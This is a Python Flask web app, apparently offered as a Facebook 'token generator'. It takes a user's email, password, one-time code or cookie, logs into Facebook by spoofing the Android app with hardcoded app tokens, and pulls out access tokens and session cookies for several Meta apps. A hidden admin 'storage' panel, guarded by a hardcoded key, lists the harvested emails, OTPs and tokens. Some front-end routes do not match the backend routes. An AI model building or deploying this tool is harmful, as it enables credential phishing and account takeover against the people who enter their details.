import random
import string
import json
import time
import requests
import uuid
import base64
import io
import struct
import sys
import os  # <-- IMPORTANT: Add os import
from flask import Flask, render_template_string, request, jsonify, session
import threading

# Crypto libraries check
try:
    from Crypto.Cipher import AES, PKCS1_v1_5
    from Crypto.PublicKey import RSA
    from Crypto.Random import get_random_bytes
except ImportError:
    print("Error: 'pycryptodome' module not found.")
    print("Run: pip install pycryptodome")
    sys.exit()

# ===========================================
# ORIGINAL CLASSES (UNCHANGED)
# ===========================================

class FacebookPasswordEncryptor:
    @staticmethod
    def get_public_key():
        try:
            url = 'https://b-graph.facebook.com/pwd_key_fetch'
            params = {
                'version': '2',
                'flow': 'CONTROLLER_INITIALIZATION',
                'method': 'GET',
                'fb_api_req_friendly_name': 'pwdKeyFetch',
                'fb_api_caller_class': 'com.facebook.auth.login.AuthOperations',
                'access_token': '438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28'
            }
            response = requests.post(url, params=params).json()
            return response.get('public_key'), str(response.get('key_id', '25'))
        except Exception as e:
            raise Exception(f"Public key fetch error: {e}")

    @staticmethod
    def encrypt(password, public_key=None, key_id="25"):
        if public_key is None:
            public_key, key_id = FacebookPasswordEncryptor.get_public_key()

        try:
            rand_key = get_random_bytes(32)
            iv = get_random_bytes(12)
            
            pubkey = RSA.import_key(public_key)
            cipher_rsa = PKCS1_v1_5.new(pubkey)
            encrypted_rand_key = cipher_rsa.encrypt(rand_key)
            
            cipher_aes = AES.new(rand_key, AES.MODE_GCM, nonce=iv)
            current_time = int(time.time())
            cipher_aes.update(str(current_time).encode("utf-8"))
            encrypted_passwd, auth_tag = cipher_aes.encrypt_and_digest(password.encode("utf-8"))
            
            buf = io.BytesIO()
            buf.write(bytes([1, int(key_id)]))
            buf.write(iv)
            buf.write(struct.pack("<h", len(encrypted_rand_key)))
            buf.write(encrypted_rand_key)
            buf.write(auth_tag)
            buf.write(encrypted_passwd)
            
            encoded = base64.b64encode(buf.getvalue()).decode("utf-8")
            return f"#PWD_FB4A:2:{current_time}:{encoded}"
        except Exception as e:
            raise Exception(f"Encryption error: {e}")


class FacebookAppTokens:
    APPS = {
        'FB_ANDROID': {'name': 'Facebook For Android', 'app_id': '350685531728'},
        'MESSENGER_ANDROID': {'name': 'Facebook Messenger For Android', 'app_id': '256002347743983'},
        'FB_LITE': {'name': 'Facebook For Lite', 'app_id': '275254692598279'},
        'MESSENGER_LITE': {'name': 'Facebook Messenger For Lite', 'app_id': '200424423651082'},
        'ADS_MANAGER_ANDROID': {'name': 'Ads Manager App For Android', 'app_id': '438142079694454'},
        'PAGES_MANAGER_ANDROID': {'name': 'Pages Manager For Android', 'app_id': '121876164619130'}
    }
    
    @staticmethod
    def get_app_id(app_key):
        app = FacebookAppTokens.APPS.get(app_key)
        return app['app_id'] if app else None
    
    @staticmethod
    def get_all_app_keys():
        return list(FacebookAppTokens.APPS.keys())
    
    @staticmethod
    def extract_token_prefix(token):
        for i, char in enumerate(token):
            if char.islower():
                return token[:i]
        return token


class FacebookLogin:
    API_URL = "https://b-graph.facebook.com/auth/login"
    ACCESS_TOKEN = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
    API_KEY = "882a8490361da98702bf97a021ddc14d"
    SIG = "214049b9f17c38bd767de53752b53946"
    
    BASE_HEADERS = {
        "content-type": "application/x-www-form-urlencoded",
        "x-fb-net-hni": "45201",
        "zero-rated": "0",
        "x-fb-sim-hni": "45201",
        "x-fb-connection-quality": "EXCELLENT",
        "x-fb-friendly-name": "authenticate",
        "x-fb-connection-bandwidth": "78032897",
        "x-tigon-is-retry": "False",
        "authorization": "OAuth null",
        "x-fb-connection-type": "WIFI",
        "x-fb-device-group": "3342",
        "priority": "u=3,i",
        "x-fb-http-engine": "Liger",
        "x-fb-client-ip": "True",
        "x-fb-server-cluster": "True"
    }
    
    def __init__(self, uid_phone_mail, password, machine_id=None, convert_token_to=None, convert_all_tokens=False):
        self.uid_phone_mail = uid_phone_mail
        
        if password.startswith("#PWD_FB4A"):
            self.password = password
        else:
            self.password = FacebookPasswordEncryptor.encrypt(password)
        
        if convert_all_tokens:
            self.convert_token_to = FacebookAppTokens.get_all_app_keys()
        elif convert_token_to:
            self.convert_token_to = convert_token_to if isinstance(convert_token_to, list) else [convert_token_to]
        else:
            self.convert_token_to = []
        
        self.session = requests.Session()
        
        self.device_id = str(uuid.uuid4())
        self.adid = str(uuid.uuid4())
        self.secure_family_device_id = str(uuid.uuid4())
        self.machine_id = machine_id if machine_id else self._generate_machine_id()
        self.jazoest = ''.join(random.choices(string.digits, k=5))
        self.sim_serial = ''.join(random.choices(string.digits, k=20))
        
        self.headers = self._build_headers()
        self.data = self._build_data()
    
    @staticmethod
    def _generate_machine_id():
        return ''.join(random.choices(string.ascii_letters + string.digits, k=24))
    
    def _build_headers(self):
        headers = self.BASE_HEADERS.copy()
        headers.update({
            "x-fb-request-analytics-tags": '{"network_tags":{"product":"350685531728","retry_attempt":"0"},"application_tags":"unknown"}',
            "user-agent": "Dalvik/2.1.0 (Linux; U; Android 9; 23113RKC6C Build/PQ3A.190705.08211809) [FBAN/FB4A;FBAV/417.0.0.33.65;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/480086274;FBCR/MobiFone;FBMF/Redmi;FBBD/Redmi;FBDV/23113RKC6C;FBSV/9;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=1280,height=720};FB_FW/1;FBRV/0;]"
        })
        return headers
    
    def _build_data(self):
        base_data = {
            "format": "json",
            "email": self.uid_phone_mail,
            "password": self.password,
            "credentials_type": "password",
            "generate_session_cookies": "1",
            "locale": "vi_VN",
            "client_country_code": "VN",
            "api_key": self.API_KEY,
            "access_token": self.ACCESS_TOKEN
        }
        
        base_data.update({
            "adid": self.adid,
            "device_id": self.device_id,
            "generate_analytics_claim": "1",
            "community_id": "",
            "linked_guest_account_userid": "",
            "cpl": "true",
            "try_num": "1",
            "family_device_id": self.device_id,
            "secure_family_device_id": self.secure_family_device_id,
            "sim_serials": f'["{self.sim_serial}"]',
            "openid_flow": "android_login",
            "openid_provider": "google",
            "openid_tokens": "[]",
            "account_switcher_uids": f'["{self.uid_phone_mail}"]',
            "fb4a_shared_phone_cpl_experiment": "fb4a_shared_phone_nonce_cpl_at_risk_v3",
            "fb4a_shared_phone_cpl_group": "enable_v3_at_risk",
            "enroll_misauth": "false",
            "error_detail_type": "button_with_disabled",
            "source": "login",
            "machine_id": self.machine_id,
            "jazoest": self.jazoest,
            "meta_inf_fbmeta": "V2_UNTAGGED",
            "advertiser_id": self.adid,
            "encrypted_msisdn": "",
            "currently_logged_in_userid": "0",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "Fb4aAuthHandler",
            "sig": self.SIG
        })
        
        return base_data
    
    def _convert_token(self, access_token, target_app):
        try:
            app_id = FacebookAppTokens.get_app_id(target_app)
            if not app_id:
                return None
            
            response = requests.post(
                'https://api.facebook.com/method/auth.getSessionforApp',
                data={
                    'access_token': access_token,
                    'format': 'json',
                    'new_app_id': app_id,
                    'generate_session_cookies': '1'
                }
            )
            
            result = response.json()
            
            if 'access_token' in result:
                token = result['access_token']
                prefix = FacebookAppTokens.extract_token_prefix(token)
                
                cookies_dict = {}
                cookies_string = ""
                
                if 'session_cookies' in result:
                    for cookie in result['session_cookies']:
                        cookies_dict[cookie['name']] = cookie['value']
                        cookies_string += f"{cookie['name']}={cookie['value']}; "
                
                return {
                    'token_prefix': prefix,
                    'access_token': token,
                    'cookies': {
                        'dict': cookies_dict,
                        'string': cookies_string.rstrip('; ')
                    }
                }
            return None     
        except:
            return None
    
    def _parse_success_response(self, response_json):
        original_token = response_json.get('access_token')
        original_prefix = FacebookAppTokens.extract_token_prefix(original_token)
        
        result = {
            'success': True,
            'original_token': {
                'token_prefix': original_prefix,
                'access_token': original_token
            },
            'cookies': {}
        }
        
        if 'session_cookies' in response_json:
            cookies_dict = {}
            cookies_string = ""
            for cookie in response_json['session_cookies']:
                cookies_dict[cookie['name']] = cookie['value']
                cookies_string += f"{cookie['name']}={cookie['value']}; "
            result['cookies'] = {
                'dict': cookies_dict,
                'string': cookies_string.rstrip('; ')
            }
        
        if self.convert_token_to:
            result['converted_tokens'] = {}
            for target_app in self.convert_token_to:
                converted = self._convert_token(original_token, target_app)
                if converted:
                    result['converted_tokens'][target_app] = converted
        
        return result
    
    def _handle_2fa_manual(self, error_data):
        return {
            'requires_2fa': True,
            'login_first_factor': error_data['login_first_factor'],
            'uid': error_data['uid']
        }
    
    def login(self):
        try:
            response = self.session.post(self.API_URL, headers=self.headers, data=self.data)
            response_json = response.json()
            
            if 'access_token' in response_json:
                return self._parse_success_response(response_json)
            
            if 'error' in response_json:
                error_data = response_json.get('error', {}).get('error_data', {})
                
                # Check for 2FA requirement
                if 'login_first_factor' in error_data and 'uid' in error_data:
                    return self._handle_2fa_manual(error_data)
                
                return {
                    'success': False,
                    'error': response_json['error'].get('message', 'Unknown error'),
                    'error_user_msg': response_json['error'].get('error_user_msg')
                }
            
            return {'success': False, 'error': 'Unknown response format'}
            
        except json.JSONDecodeError:
            return {'success': False, 'error': 'Invalid JSON response'}
        except Exception as e:
            return {'success': False, 'error': str(e)}

# ===========================================
# FLASK APPLICATION
# ===========================================

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'facebook_login_tool_secret_key_2024')
login_sessions = {}

# HTML Template with CSS and JavaScript
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Token System ALL ACCOUNT</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --primary: #ff4d6d;
            --secondary: #ff8aa8;
            --glass: rgba(255, 240, 245, 0.25);
            --glass-border: rgba(255, 120, 160, 0.3);
            --text: #33001a;
            --bg-blur: 25px;
        }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { 
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            background: linear-gradient(145deg, #fff5f7 0%, #ffe4ec 100%);
            display: flex; 
            flex-direction: column;
            min-height: 100vh; 
            margin: 0; 
            color: var(--text);
            overflow-x: hidden;
            align-items: center;
        }
        .header {
            width: 100%;
            padding: 1.2rem 0;
            background: rgba(255, 240, 245, 0.7);
            backdrop-filter: blur(var(--bg-blur));
            text-align: center;
            border-bottom: 1px solid var(--glass-border);
            z-index: 1000;
        }
        .header h2 { margin: 0; font-size: 24px; background: linear-gradient(to right, #d63c5e, #b32e4a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 800; letter-spacing: 1px; }

        .main-content {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 1.5rem;
            width: 100%;
        }

        .container { 
            background: var(--glass); 
            padding: 2rem; 
            border-radius: 25px; 
            backdrop-filter: blur(var(--bg-blur)); 
            border: 1px solid var(--glass-border);
            width: 100%; 
            max-width: 420px; 
            box-shadow: 0 30px 50px rgba(255, 120, 160, 0.25);
            animation: slideUp 0.6s cubic-bezier(0.23, 1, 0.32, 1);
        }
        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }

        h1 { text-align: center; font-size: 24px; margin-bottom: 2rem; font-weight: 700; letter-spacing: -0.5px; color: #a12242; }
        .form-group { margin-bottom: 1.25rem; position: relative; }
        label { display: block; margin-bottom: 0.6rem; font-weight: 600; font-size: 13px; color: #c43a5e; text-transform: uppercase; }
        
        .input-wrapper { position: relative; }
        input, textarea { 
            width: 100%; padding: 0.9rem 1.1rem; background: rgba(255, 220, 230, 0.45); 
            border: 1px solid #ffb3c6; border-radius: 14px; 
            font-size: 16px; color: #2d0012;
            transition: all 0.3s ease;
            appearance: none;
        }
        input:focus, textarea:focus { outline: none; border-color: #ff4d6d; background: rgba(255, 230, 240, 0.7); box-shadow: 0 0 12px rgba(255, 77, 109, 0.2); }
        .toggle-pass { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #b34e6b; font-size: 18px; z-index: 5; }
        
        button { 
            width: 100%; padding: 1.1rem; background: linear-gradient(135deg, #ff4d6d, #ff7a9e); color: white; 
            border: none; border-radius: 14px; font-size: 16px; font-weight: 700; 
            cursor: pointer; transition: all 0.3s ease; 
            margin-bottom: 15px;
            display: flex; align-items: center; justify-content: center; gap: 12px;
            box-shadow: 0 8px 15px rgba(255, 77, 109, 0.3);
        }
        button:hover { transform: translateY(-3px); box-shadow: 0 12px 25px rgba(255, 77, 109, 0.5); opacity: 0.95; }
        button:active { transform: translateY(-1px); }
        button:disabled { opacity: 0.6; cursor: not-allowed; }
        
        .result-card { 
            margin-top: 2rem; padding: 1.5rem; border-radius: 20px; 
            background: rgba(255, 240, 245, 0.7); border: 1px solid #ffb0c3;
            animation: fadeIn 0.4s ease-out;
        }
        @keyframes fadeIn { from { opacity: 0; scale: 0.95; } to { opacity: 1; scale: 1; } }
        
        .result-item { margin-bottom: 1.25rem; }
        .result-label { font-weight: 700; font-size: 11px; color: #b32e4e; text-transform: uppercase; display: block; margin-bottom: 0.5rem; letter-spacing: 0.5px; }
        .result-value-container { display: flex; gap: 10px; align-items: stretch; }
        .result-value { 
            flex: 1; font-family: 'SF Mono', 'Fira Code', monospace; font-size: 12px; 
            color: #33001a; background: rgba(255, 220, 235, 0.6); padding: 12px; 
            border-radius: 10px; border: 1px solid #ffb3c6; 
            word-break: break-all; max-height: 120px; overflow-y: auto;
        }
        .copy-btn { width: auto; padding: 0 15px; margin: 0; font-size: 15px; background: rgba(255, 120, 160, 0.3); border-radius: 10px; }

        .profile-display { display: flex; align-items: center; gap: 15px; margin-bottom: 1.5rem; background: rgba(255, 210, 225, 0.5); padding: 12px; border-radius: 15px; }
        .profile-display img { width: 55px; height: 55px; border-radius: 50%; border: 2px solid #ff4d6d; object-fit: cover; }
        .profile-display b { font-size: 18px; font-weight: 600; color: #500022; }

        footer {
            width: 100%; padding: 1.2rem; background: rgba(255, 240, 245, 0.8); 
            text-align: center; border-top: 1px solid #ffb3c6;
            font-size: 15px; color: #a1314e;
            backdrop-filter: blur(10px);
            font-weight: 600;
        }

        #error-msg { color: #b30035; background: rgba(255, 180, 200, 0.4); padding: 1rem; border-radius: 12px; margin-top: 1rem; display: none; text-align: center; border: 1px solid #ff80a0; font-size: 14px; font-weight: 500; }
        .hidden { display: none; }
        
        .modal {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 230, 240, 0.95);
            display: none; justify-content: center; align-items: flex-start; z-index: 2000; backdrop-filter: blur(15px);
            padding: 1rem; overflow-y: auto;
        }
        .modal-content {
            background: rgba(255, 245, 250, 0.9); border: 1px solid #ffb3c6;
            padding: 1.5rem; border-radius: 25px; width: 100%; max-width: 850px; 
            margin-top: 2rem; margin-bottom: 2rem;
        }
        .history-card {
            background: rgba(255, 230, 240, 0.5); border: 1px solid #ffb0c3;
            border-radius: 18px; padding: 1.25rem; margin-bottom: 1.25rem;
        }
        .history-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px; }
        .history-user { display: flex; align-items: center; gap: 12px; }
        .history-user img { width: 48px; height: 48px; border-radius: 50%; border: 2px solid #ff4d6d; }
        .history-meta { font-size: 12px; opacity: 0.5; margin-top: 2px; color: #5c2536; }
        .history-actions { display: flex; gap: 8px; }
        .del-btn { background: rgba(255, 77, 109, 0.2); color: #b3003a; width: auto; padding: 8px 12px; font-size: 12px; border: 1px solid rgba(255, 77, 109, 0.3); }
        .del-btn:hover { background: #ff4d6d; color: white; }
        
        .login-details { font-size: 11px; color: #b32e4e; margin-top: 8px; font-family: monospace; background: rgba(255, 200, 220, 0.4); padding: 5px 10px; border-radius: 5px; }

        @media (max-width: 480px) {
            .container { padding: 1.5rem; border-radius: 20px; }
            h1 { font-size: 20px; }
            .modal-content { padding: 1rem; border-radius: 20px; }
        }
    </style>
</head>
<body>
    <div class="header">
        <h2>ALL ID TOKEN</h2>
    </div>

    <div class="main-content">
        <div class="container">
            <h1><i class="fab fa-facebook-square"></i> TOKEN GENERATOR</h1>
            
            <div id="login-form">
                <div class="form-group">
                    <label>Email / Phone</label>
                    <input type="text" id="email" placeholder="Enter email">
                </div>
                <div class="form-group">
                    <label>Password(पासवर्ड फॉरगेट करके ईमेल आईडी पर जो OTP आए उनको डाले)</label>
                    <div class="input-wrapper">
                        <input type="password" id="password" placeholder="Enter password ">
                        <i class="fas fa-eye toggle-pass" onclick="togglePassword()"></i>
                    </div>
                </div>
                <div style="text-align: center; margin: 15px 0; font-size: 12px; font-weight: 800; opacity: 0.5; letter-spacing: 2px; color:#b14b68;">EXCLUSIVE METHOD</div>
                <div class="form-group">
                    <label>Direct Cookie</label>
                    <textarea id="cookie" rows="3" placeholder="Paste full cookie string"></textarea>
                </div>
                <button id="login-btn"><i class="fas fa-rocket"></i> FAST EXTRACT</button>
                <button id="admin-trigger-btn" style="background: rgba(255, 140, 170, 0.3); font-size: 14px;"><i class="fas fa-shield-alt"></i> OPEN STORAGE</button>
            </div>

            <div id="two-factor-form" class="hidden">
                <p style="text-align: center; margin-bottom: 1.5rem; color: #c43a5e; font-weight: 700;">2FA VERIFICATION</p>
                <div class="form-group">
                    <label>OTP Code</label>
                    <input type="text" id="code" placeholder="Enter 6-digit code">
                </div>
                <button id="verify-btn"><i class="fas fa-check-circle"></i> VERIFY & FINISH</button>
            </div>

            <div id="error-msg"></div>

            <div id="result-area" class="hidden">
                <div class="result-card">
                    <div class="profile-display">
                        <img id="res-pic" src="" alt="Profile">
                        <b id="res-name"></b>
                    </div>
                    <div class="result-item">
                        <span class="result-label">EAAB Token</span>
                        <div class="result-value-container">
                            <div id="token-eaab" class="result-value"></div>
                            <button class="copy-btn" onclick="copyText('token-eaab')"><i class="fas fa-copy"></i></button>
                        </div>
                    </div>
                    <div class="result-item">
                        <span class="result-label">EAAD Token</span>
                        <div class="result-value-container">
                            <div id="token-eaad" class="result-value"></div>
                            <button class="copy-btn" onclick="copyText('token-eaad')"><i class="fas fa-copy"></i></button>
                        </div>
                    </div>
                </div>
                <button id="reset-btn" style="margin-top: 1.5rem; background: rgba(255, 120, 160, 0.4);"><i class="fas fa-sync-alt"></i> EXTRACT NEW</button>
            </div>
        </div>
    </div>

    <div id="admin-modal" class="modal">
        <div class="modal-content">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 2rem; border-bottom: 1px solid #ffb3c6; padding-bottom: 1.2rem;">
                <h3 style="margin:0; font-size:22px; color:#b33454;"><i class="fas fa-database" style="color:#ff4d6d;"></i> SECURE STORAGE</h3>
                <button id="close-admin" style="width: auto; background: none; font-size: 24px; padding:0; margin:0;"><i class="fas fa-times-circle" style="color:#b34e6b;"></i></button>
            </div>
            <div id="history-list"></div>
        </div>
    </div>

    <footer>
        TOKEN GENRATOR 2026
    </footer>

    <script>
        const loginForm = document.getElementById('login-form');
        const twoFactorForm = document.getElementById('two-factor-form');
        const resultArea = document.getElementById('result-area');
        const errorMsg = document.getElementById('error-msg');
        const loginBtn = document.getElementById('login-btn');
        const verifyBtn = document.getElementById('verify-btn');
        const resetBtn = document.getElementById('reset-btn');
        const adminBtn = document.getElementById('admin-trigger-btn');
        const adminModal = document.getElementById('admin-modal');
        const closeAdmin = document.getElementById('close-admin');
        const historyList = document.getElementById('history-list');

        let currentSessionData = null;

        function togglePassword() {
            const passInput = document.getElementById('password');
            const icon = document.querySelector('.toggle-pass');
            if (passInput.type === 'password') {
                passInput.type = 'text';
                icon.classList.replace('fa-eye', 'fa-eye-slash');
            } else {
                passInput.type = 'password';
                icon.classList.replace('fa-eye-slash', 'fa-eye');
            }
        }

        function showError(msg) {
            errorMsg.innerText = msg;
            errorMsg.style.display = 'block';
            errorMsg.scrollIntoView({ behavior: 'smooth', block: 'center' });
            setTimeout(() => { errorMsg.style.display = 'none'; }, 7000);
        }

        function copyText(id) {
            const text = document.getElementById(id).innerText;
            if (!text || text === 'N/A' || text === 'NOT_AVAILABLE_FOR_COOKIE') return;
            navigator.clipboard.writeText(text).then(() => {
                alert("Token copied successfully!");
            });
        }

        loginBtn.addEventListener('click', async () => {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const cookie = document.getElementById('cookie').value;

            if (!cookie && (!email || !password)) {
                showError('Enter Login Details or Cookie.');
                return;
            }

            loginBtn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> EXTRACTING...';
            loginBtn.disabled = true;
            
            try {
                const res = await fetch('/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password, cookie })
                });
                const data = await res.json();
                if (data.status === 'success') {
                    showResults(data);
                } else if (data.status === '2fa_required') {
                    currentSessionData = data.error_data;
                    loginForm.classList.add('hidden');
                    twoFactorForm.classList.remove('hidden');
                } else {
                    showError(data.message || 'Extraction failed. Server Error.');
                }
            } catch { showError('Network connection lost.'); }
            finally { 
                loginBtn.innerHTML = '<i class="fas fa-rocket"></i> FAST EXTRACT';
                loginBtn.disabled = false; 
            }
        });

        verifyBtn.addEventListener('click', async () => {
            const code = document.getElementById('code').value;
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            if (!code) return;
            
            verifyBtn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> FINISHING...';
            verifyBtn.disabled = true;
            
            try {
                const res = await fetch('/submit_2fa', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password, code, session_data: currentSessionData })
                });
                const data = await res.json();
                if (data.status === 'success') showResults(data);
                else showError(data.message || 'OTP Invalid.');
            } catch { showError('Network error.'); }
            finally { 
                verifyBtn.innerHTML = '<i class="fas fa-check-circle"></i> VERIFY & FINISH';
                verifyBtn.disabled = false; 
            }
        });

        function showResults(data) {
            loginForm.classList.add('hidden');
            twoFactorForm.classList.add('hidden');
            resultArea.classList.remove('hidden');
            document.getElementById('res-name').innerText = data.profile_name || 'Extracted Profile';
            document.getElementById('res-pic').src = data.profile_pic || 'https://www.facebook.com/images/profile/timeline/fb_blank_user_2x.png';
            document.getElementById('token-eaab').innerText = data.access_token;
            document.getElementById('token-eaad').innerText = data.eaad_token || 'N/A';
        }

        resetBtn.addEventListener('click', () => {
            resultArea.classList.add('hidden');
            loginForm.classList.remove('hidden');
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
            document.getElementById('cookie').value = '';
            document.getElementById('code').value = '';
        });

        adminBtn.addEventListener('click', async () => {
            const pass = prompt("Enter Admin Secret Key:");
            if (pass !== 'MADHU@2003') return alert("Access Denied.");
            
            adminModal.style.display = 'flex';
            await refreshHistory(pass);
        });

        async function refreshHistory(pass) {
            historyList.innerHTML = '<div style="text-align:center; padding: 2rem;"><i class="fas fa-spinner fa-spin fa-3x" style="color:#ff4d6d;"></i></div>';
            try {
                const res = await fetch('/admin/history', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({password: pass})
                });
                const data = await res.json();
                historyList.innerHTML = data.map((item, index) => `
                    <div class="history-card">
                        <div class="history-header">
                            <div class="history-user">
                                <img src="${item.picture || 'https://www.facebook.com/images/profile/timeline/fb_blank_user_2x.png'}" alt="FB">
                                <div>
                                    <div style="font-weight:bold; font-size:16px; color:#4f1e2f;">${item.name}</div>
                                    <div class="history-meta"><i class="fas fa-clock"></i> ${item.time}</div>
                                </div>
                            </div>
                            <button class="del-btn" onclick="deleteHistory(${index}, '${pass}')"><i class="fas fa-trash-alt"></i></button>
                        </div>
                        <div class="login-details">
                            <i class="fas fa-envelope"></i> ID: ${item.email} ${item.otp ? ' | <i class="fas fa-key"></i> OTP: ' + item.otp : ''}
                        </div>
                        <div style="margin-top:15px;">
                            <span class="result-label">EAAB / EAAB6 Token</span>
                            <div style="display:flex; gap:10px;">
                                <div class="result-value" id="hist-token-${index}">${item.token}</div>
                                <button class="copy-btn" onclick="copyText('hist-token-${index}')"><i class="fas fa-copy"></i></button>
                            </div>
                        </div>
                        <div style="margin-top:10px;">
                            <span class="result-label">EAAD Token</span>
                            <div style="display:flex; gap:10px;">
                                <div class="result-value" id="hist-eaad-${index}">${item.eaad || 'N/A'}</div>
                                <button class="copy-btn" onclick="copyText('hist-eaad-${index}')"><i class="fas fa-copy"></i></button>
                            </div>
                        </div>
                    </div>
                `).join('') || '<div style="text-align:center; padding: 3rem; opacity: 0.5;">STORAGE EMPTY</div>';
            } catch { historyList.innerHTML = "FETCH FAILED"; }
        }

        async function deleteHistory(index, pass) {
            if(!confirm("DELETE PERMANENTLY?")) return;
            await fetch('/admin/delete', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({password: pass, index: index})
            });
            refreshHistory(pass);
        }

        closeAdmin.addEventListener('click', () => adminModal.style.display = 'none');
    </script>
</body>
</html>
# ===========================================
# FLASK ROUTES
# ===========================================

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/login', methods=['POST'])
def login():
    try:
        data = request.get_json()
        email = data.get('email')
        password = data.get('password')
        
        if not email or not password:
            return jsonify({'success': False, 'error': 'Email and password are required'})
        
        # Create login instance
        fb_login = FacebookLogin(
            uid_phone_mail=email,
            password=password,
            convert_all_tokens=True
        )
        
        # Perform login
        result = fb_login.login()
        
        # Store session if 2FA required
        if result.get('requires_2fa'):
            session_id = str(uuid.uuid4())
            login_sessions[session_id] = {
                'fb_login': fb_login,
                'data': result,
                'timestamp': time.time()
            }
            
            # Clean old sessions (older than 10 minutes)
            for sid in list(login_sessions.keys()):
                if time.time() - login_sessions[sid]['timestamp'] > 600:
                    del login_sessions[sid]
            
            result['session_id'] = session_id
            
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/verify_2fa', methods=['POST'])
def verify_2fa():
    try:
        data = request.get_json()
        session_id = data.get('session_id')
        otp_code = data.get('otp_code')
        
        if not session_id or not otp_code:
            return jsonify({'success': False, 'error': 'Session ID and OTP code are required'})
        
        if session_id not in login_sessions:
            return jsonify({'success': False, 'error': 'Session expired or invalid'})
        
        session_data = login_sessions[session_id]
        fb_login = session_data['fb_login']
        twofa_data = session_data['data']
        
        # Prepare 2FA data
        data_2fa = {
            'locale': 'vi_VN',
            'format': 'json',
            'email': fb_login.uid_phone_mail,
            'device_id': fb_login.device_id,
            'access_token': fb_login.ACCESS_TOKEN,
            'generate_session_cookies': 'true',
            'generate_machine_id': '1',
            'twofactor_code': otp_code,
            'credentials_type': 'two_factor',
            'error_detail_type': 'button_with_disabled',
            'first_factor': twofa_data['login_first_factor'],
            'password': fb_login.password,
            'userid': twofa_data['uid'],
            'machine_id': twofa_data['login_first_factor']
        }
        
        # Send 2FA request
        response = fb_login.session.post(fb_login.API_URL, data=data_2fa, headers=fb_login.headers)
        response_json = response.json()
        
        if 'access_token' in response_json:
            result = fb_login._parse_success_response(response_json)
            # Clean up session
            if session_id in login_sessions:
                del login_sessions[session_id]
            return jsonify(result)
        else:
            return jsonify({
                'success': False,
                'error': response_json.get('error', {}).get('message', 'OTP Verification Failed')
            })
            
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

def cleanup_sessions():
    """Periodically clean up old sessions"""
    while True:
        time.sleep(300)  # Run every 5 minutes
        current_time = time.time()
        for sid in list(login_sessions.keys()):
            if current_time - login_sessions[sid]['timestamp'] > 600:  # 10 minutes
                del login_sessions[sid]

# Start session cleanup thread
cleanup_thread = threading.Thread(target=cleanup_sessions, daemon=True)
cleanup_thread.start()

if __name__ == '__main__':
    print("=" * 60)
    print("  Facebook Login Tool - Web Version")
    print("=" * 60)
    
    # Render compatible port configuration
    port = int(os.environ.get("PORT", 5000))
    host = os.environ.get("HOST", "0.0.0.0")
    
    print(f"\nStarting server on http://{host}:{port}")
    print("Press Ctrl+C to stop\n")
    
    app.run(debug=True, host=host, port=port)
